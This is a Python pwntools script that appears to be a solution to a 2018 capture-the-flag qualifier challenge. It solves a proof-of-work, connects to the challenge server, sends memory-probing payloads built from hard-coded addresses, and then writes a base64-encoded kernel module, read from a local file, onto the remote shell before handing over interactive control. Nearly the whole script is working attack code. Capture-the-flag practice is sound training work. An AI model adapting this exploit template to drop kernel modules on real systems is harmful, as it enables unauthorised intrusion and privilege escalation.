#!/usr/bin/env python
from __future__ import print_function
from pwn import *
context(os='linux', arch='amd64')
import sys
import time
import struct
import hashlib


DEBUG = False

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

def original_main():
    challenge = sys.argv[1]
    n = int(sys.argv[2])

    print('Solving challenge: "{}", n: {}'.format(challenge, n))

    solution = solve_pow(challenge, n)
    print('Solution: {} -> {}'.format(solution, pow_hash(challenge, solution)))

def calc_pow(p):
    p.recvuntil('Challenge: ')
    challenge = p.recvline().strip()
    p.recvuntil('n: ')
    n = int(p.recvline().strip())
    sol = solve_pow(challenge, n)
    p.recvuntil('Solution:')
    p.sendline(str(sol))


def one_time(p, idx):
    if not DEBUG:
        p.recvuntil('Go')
    p.send(p64(idx & 0xffffffffffffffff) + 'a' * 7)
    time.sleep(0.2)
    p.send('b' * 4)
    time.sleep(0.2)
    #p.send(p64(0xffffffffff600000) * (1024 / 2 * 3 / 8))
    #p.send(p64(0x400000) * (1024 / 8))
    #p.send(p32(0x8049000) * (1024 / 4))
    p.send(p32(0x8048000) * (512 / 4))


def main():
    if not DEBUG:
        p = remote('11d9f496.quals2018.oooverflow.io', 31337)
        calc_pow(p)
    else:
        #p = process('./test32-pie')
        raw_input()

    with open('payload', 'r') as f:
        content = f.read()
    p.recvuntil('have fun!')
    p.recvuntil('#')
    p.sendline('echo "{}" | base64 -d > exp.ko'.format(content))
    p.interactive()


if __name__ == '__main__':
    main()
